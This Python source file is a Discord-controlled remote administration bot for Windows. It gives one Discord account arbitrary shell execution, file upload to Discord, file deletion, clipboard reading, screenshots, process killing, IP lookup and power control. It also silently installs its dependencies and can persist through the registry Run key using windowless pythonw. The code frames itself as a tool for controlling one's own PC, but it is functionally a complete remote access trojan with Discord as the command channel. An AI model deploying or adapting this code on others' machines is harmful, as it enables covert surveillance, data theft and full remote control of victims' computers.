import subprocess
import sys
import os
import platform
import socket
import logging
import io
import shutil
from pathlib import Path
from datetime import datetime

# Auto-install dependencies
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])

required = [
    "discord.py",
    "Pillow",
    "mss",
    "psutil",
    "pywin32",
]

for pkg in required:
    try:
        if pkg == "Pillow":
            __import__("PIL")
        elif pkg == "pywin32":
            __import__("win32api")
        else:
            __import__(pkg.split(".")[0])
    except ImportError:
        print(f"Installing {pkg}...")
        install(pkg)

import discord
from discord.ext import commands
from PIL import Image
import mss
import psutil
import win32clipboard
import win32con
import win32api
import winreg

#CONFIG
TOKEN = "YOUR_BOT_TOKEN_HERE"
OWNER_ID = 123456789012345678
PREFIX = "!"
LOG_FILE = "remote_bot.log"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE, encoding="utf-8"),
        logging.StreamHandler()
    ]
)
log = logging.getLogger("RemoteBot")

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

current_dir = Path.cwd()

def is_owner(ctx):
    return ctx.author.id == OWNER_ID

def run_cmd(command, timeout=30):
    try:
        result = subprocess.run(
            command,
            shell=True,
            cwd=str(current_dir),
            capture_output=True,
            text=True,
            timeout=timeout,
            encoding="utf-8",
            errors="replace"
        )
        output = (result.stdout or "") + (result.stderr or "")
        return output.strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return "Command timed out."
    except Exception as e:
        return f"Error: {e}"

def get_script_path():
    return str(Path(__file__).resolve())

def add_to_startup():
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0, winreg.KEY_SET_VALUE
    )
    pythonw = sys.executable.replace("python.exe", "pythonw.exe")
    if not Path(pythonw).exists():
        pythonw = sys.executable
    cmd = f'"{pythonw}" "{get_script_path()}"'
    winreg.SetValueEx(key, "DiscordRemoteBot", 0, winreg.REG_SZ, cmd)
    winreg.CloseKey(key)
    return True

def remove_from_startup():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, "DiscordRemoteBot")
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False

def is_in_startup():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_READ
        )
        winreg.QueryValueEx(key, "DiscordRemoteBot")
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False

@bot.event
async def on_ready():
    log.info(f"Logged in as {bot.user} (ID: {bot.user.id})")
    log.info(f"Working directory: {current_dir}")
    print(f"Bot ready. Logged in as {bot.user}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Access denied.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Missing argument.")
    else:
        log.error(f"Command error: {error}")
        await ctx.send(f"Error: {error}")

@bot.command(name="help")
@commands.check(is_owner)
async def help_cmd(ctx):
    help_text = """
**Available commands:**

**Navigation**
!ls / !dir          - List files
!cd <path>          - Change directory
!back               - Go up one level
!pwd                - Show current directory

**Execution**
!exe <command>      - Run any command
!run <file>         - Start a program

**Files**
!download <file>    - Send a file to Discord
!delete / !del / !delet <name> - Delete file or folder
!mkdir <name>       - Create folder

**System**
!sysinfo            - System information
!ip                 - Local + public IP
!processes          - List running processes
!kill <pid>         - Kill process by PID
!clipboard          - Get clipboard text
!msg <text>         - Show message box on PC
!screenshot         - Take screenshot

**Power**
!shutdown           - Shutdown PC
!restart            - Restart PC
!lock               - Lock workstation
!sleep              - Put PC to sleep

**Autostart**
!autostart on       - Enable start with Windows
!autostart off      - Disable start with Windows
!autostart status   - Check status
"""
    await ctx.send(help_text)

@bot.command(name="ls", aliases=["dir"])
@commands.check(is_owner)
async def ls(ctx):
    try:
        items = list(current_dir.iterdir())
        if not items:
            await ctx.send("Directory is empty.")
            return

        lines = []
        for item in sorted(items, key=lambda x: (not x.is_dir(), x.name.lower())):
            if item.is_dir():
                lines.append(f"[DIR]  {item.name}")
            else:
                size = item.stat().st_size
                lines.append(f"[FILE] {item.name}  ({size} bytes)")

        text = "\n".join(lines)
        if len(text) > 1900:
            text = text[:1900] + "\n... (truncated)"
        await ctx.send(f"Current: `{current_dir}`\n```\n{text}\n```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="cd")
@commands.check(is_owner)
async def cd(ctx, *, path: str = None):
    global current_dir
    if path is None:
        await ctx.send(f"Current directory: `{current_dir}`")
        return
    try:
        new_path = (current_dir / path).resolve()
        if not new_path.exists() or not new_path.is_dir():
            await ctx.send("Invalid directory.")
            return
        current_dir = new_path
        await ctx.send(f"Changed to: `{current_dir}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="back")
@commands.check(is_owner)
async def back(ctx):
    global current_dir
    current_dir = current_dir.parent
    await ctx.send(f"Moved to: `{current_dir}`")

@bot.command(name="pwd")
@commands.check(is_owner)
async def pwd(ctx):
    await ctx.send(f"`{current_dir}`")

@bot.command(name="exe")
@commands.check(is_owner)
async def exe(ctx, *, command: str):
    output = run_cmd(command)
    if len(output) > 1900:
        output = output[:1900] + "\n... (truncated)"
    await ctx.send(f"```\n{output}\n```")

@bot.command(name="run")
@commands.check(is_owner)
async def run(ctx, *, filepath: str):
    try:
        full = (current_dir / filepath).resolve()
        if not full.exists():
            await ctx.send("File not found.")
            return
        os.startfile(str(full))
        await ctx.send(f"Started: `{full.name}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="download")
@commands.check(is_owner)
async def download(ctx, *, filename: str):
    try:
        path = (current_dir / filename).resolve()
        if not path.exists() or not path.is_file():
            await ctx.send("File not found.")
            return
        if path.stat().st_size > 25 * 1024 * 1024:
            await ctx.send("File too large (max 25 MB).")
            return
        await ctx.send(file=discord.File(str(path)))
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="delete", aliases=["del", "delet"])
@commands.check(is_owner)
async def delete(ctx, *, target: str):
    """Delete a file or folder. Usage: !delete name  |  !del name  |  !delet name"""
    try:
        path = (current_dir / target).resolve()

        if not path.exists():
            await ctx.send("File or folder not found.")
            return

        if path.is_file():
            path.unlink()
            await ctx.send(f"Deleted file: `{path.name}`")
        elif path.is_dir():
            shutil.rmtree(path)
            await ctx.send(f"Deleted folder: `{path.name}`")
        else:
            await ctx.send("Not a file or folder.")
    except PermissionError:
        await ctx.send("Permission denied.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="mkdir")
@commands.check(is_owner)
async def mkdir(ctx, *, name: str):
    try:
        path = current_dir / name
        path.mkdir(parents=True, exist_ok=True)
        await ctx.send(f"Created: `{path}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="sysinfo")
@commands.check(is_owner)
async def sysinfo(ctx):
    try:
        boot = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage("C:\\")

        info = f"""**System Information**
OS: {platform.platform()}
Hostname: {socket.gethostname()}
CPU Usage: {cpu}%
RAM: {mem.percent}% used ({round(mem.used/1024**3,1)} / {round(mem.total/1024**3,1)} GB)
Disk C: {disk.percent}% used ({round(disk.used/1024**3,1)} / {round(disk.total/1024**3,1)} GB)
Boot time: {boot}
Python: {platform.python_version()}
"""
        await ctx.send(info)
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="ip")
@commands.check(is_owner)
async def ip(ctx):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local = s.getsockname()[0]
        s.close()
        hostname = socket.gethostname()

        msg = f"Hostname: `{hostname}`\nLocal IP: `{local}`"
        try:
            import urllib.request
            public = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
            msg += f"\nPublic IP: `{public}`"
        except:
            msg += "\nPublic IP: (unavailable)"
        await ctx.send(msg)
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="processes")
@commands.check(is_owner)
async def processes(ctx):
    try:
        lines = []
        for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]):
            try:
                info = p.info
                lines.append(f"{info['pid']:>6}  {info['name'][:30]:<30}  CPU:{info['cpu_percent']:>5.1f}%  MEM:{info['memory_percent']:>5.1f}%")
            except:
                continue
        text = "\n".join(lines[:40])
        if len(lines) > 40:
            text += f"\n... and {len(lines)-40} more"
        await ctx.send(f"```\nPID     Name                            CPU%    MEM%\n{text}\n```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="kill")
@commands.check(is_owner)
async def kill(ctx, pid: int):
    try:
        p = psutil.Process(pid)
        name = p.name()
        p.terminate()
        await ctx.send(f"Terminated: {name} (PID {pid})")
    except psutil.NoSuchProcess:
        await ctx.send("Process not found.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="clipboard")
@commands.check(is_owner)
async def clipboard(ctx):
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        if len(data) > 1900:
            data = data[:1900] + "\n... (truncated)"
        await ctx.send(f"Clipboard content:\n```\n{data}\n```")
    except Exception as e:
        await ctx.send(f"Clipboard empty or error: {e}")

@bot.command(name="msg")
@commands.check(is_owner)
async def msg(ctx, *, text: str):
    try:
        win32api.MessageBox(0, text, "Remote Message", 0x40)
        await ctx.send("Message box displayed.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="screenshot")
@commands.check(is_owner)
async def screenshot(ctx):
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            sct_img = sct.grab(monitor)
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            buffer = io.BytesIO()
            img.save(buffer, format="PNG")
            buffer.seek(0)
            await ctx.send(file=discord.File(buffer, filename="screenshot.png"))
    except Exception as e:
        await ctx.send(f"Screenshot failed: {e}")

@bot.command(name="shutdown")
@commands.check(is_owner)
async def shutdown(ctx):
    await ctx.send("Shutting down in 5 seconds...")
    os.system("shutdown /s /t 5")

@bot.command(name="restart")
@commands.check(is_owner)
async def restart(ctx):
    await ctx.send("Restarting in 5 seconds...")
    os.system("shutdown /r /t 5")

@bot.command(name="lock")
@commands.check(is_owner)
async def lock(ctx):
    win32api.LockWorkStation()
    await ctx.send("Workstation locked.")

@bot.command(name="sleep")
@commands.check(is_owner)
async def sleep(ctx):
    await ctx.send("Putting PC to sleep...")
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

@bot.command(name="autostart")
@commands.check(is_owner)
async def autostart(ctx, action: str = "status"):
    action = action.lower()
    if action == "on":
        add_to_startup()
        await ctx.send("Autostart enabled. Bot will start with Windows.")
    elif action == "off":
        if remove_from_startup():
            await ctx.send("Autostart disabled.")
        else:
            await ctx.send("Autostart was not enabled.")
    else:
        status = "enabled" if is_in_startup() else "disabled"
        await ctx.send(f"Autostart is currently **{status}**.")

if __name__ == "__main__":
    if TOKEN == "YOUR_BOT_TOKEN_HERE" or OWNER_ID == 123456789012345678:
        print("ERROR: Set your TOKEN and OWNER_ID in the script first!")
        sys.exit(1)

    log.info("Starting bot...")
    bot.run(TOKEN)
